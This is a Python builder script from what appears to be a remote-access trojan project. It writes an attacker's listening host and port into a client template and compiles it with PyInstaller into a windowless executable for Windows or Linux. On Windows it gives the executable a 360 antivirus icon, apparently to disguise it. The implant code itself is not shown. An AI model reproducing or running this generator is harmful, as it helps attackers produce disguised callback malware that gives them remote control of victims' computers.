#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/4/8 23:30

import os
import sys
sys.path.append("..")
import subprocess
from misc.color import Colors
os.chdir("..")
from argparse import ArgumentParser

class GenScript:
    keyWord = "gen"
    moduleName = "genScript"

    def __init__(self):
        self.args = self.parseArgs()
        self.generateScript()

    def parseArgs(self):
        parser = ArgumentParser(prog=self.keyWord)
        parser.add_argument("-lh", "--lhost", type=str, required=True, help=f"The listening host")
        parser.add_argument("-lp", "--lport", type=int, required=False, default=1116, help=f"The listening port, default is 1116")
        parser.add_argument("-a", "--platform", type=str, required=True, choices=["win", "linux"], help=f"The remote platform (win or linux)")
        parser.add_argument("--screenHost", action="store_true", default=False, help=f"open screen host script")
        return parser.parse_args()

    def generateScript(self):
        localPlatform = sys.platform
        remotePlatform = self.args.platform
        host = self.args.lhost
        port = str(self.args.lport)
        with open("./client1.py", "r") as f1, open("./client_tmp.py", "w") as f2:
            for line in f1:
                line = line.replace("$HOST$", host).replace('"$PORT$"', port)
                f2.write(line)
        try:
            # 当前运行平台是Linux
            if "linux" in localPlatform:
                subprocess.Popen("pyinstaller -Fw client_tmp.py", shell=True, stdout=subprocess.PIPE).wait()
                if remotePlatform == "win":
                    if not os.path.exists("./docker-pyinstaller/src"):
                        os.mkdir("./docker-pyinstaller/src/")
                    cmd = ["mv client_tmp.spec ./docker-pyinstaller/src", "mv client_tmp.py ./docker-pyinstaller/src"]
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
                    os.chdir("./docker-pyinstaller/src")
                    cmd = ["pipreqs ./ --force", "docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows"]
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
                else:
                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
                for i in range(2):
                    os.chdir(os.path.abspath(os.path.pardir))
            # 当前运行平台是Windows
            elif "win" in localPlatform:
                if remotePlatform == "win":
                    subprocess.Popen("pyinstaller -Fw -i ./misc/360.ico client_tmp.py", shell=True,
                                     stdout=subprocess.PIPE).wait()
                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
                else:
                    if not os.path.exists("./dist/"):
                        os.mkdir("./dist/")
                    subprocess.Popen("copy .\client_tmp.py .\dist\client_tmp.py /Y", shell=True,
                                     stdout=subprocess.PIPE).wait()
                    os.remove("./client_tmp.py")
                    print(Colors.GREEN + "[+]" + Colors.END + " Sucessfully! The File in ./dist/")
            else:
                print(Colors.YELLOW + "[!]" + Colors.END + " Only Support Windows/Linux.")
            # 删除临时文件和目录
            cmd = []
            if "win" in localPlatform and remotePlatform == "win":
                cmd = "rd /s/q .\__pycache__ & rd /s/q .\\build & del .\client_tmp.py & del .\client_tmp.spec"
            elif "linux" in localPlatform:
                cmd = ["rm -rf __pycache__", "rm -rf build", "rm client_tmp.py"]
            subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).wait()
        except:
            print("Something Error. Maybe You Should Check The Operating Environment, Like pipreps、docker、docker-pyinstaller、pyinstaller.")

if __name__ == "__main__":
    GenScript()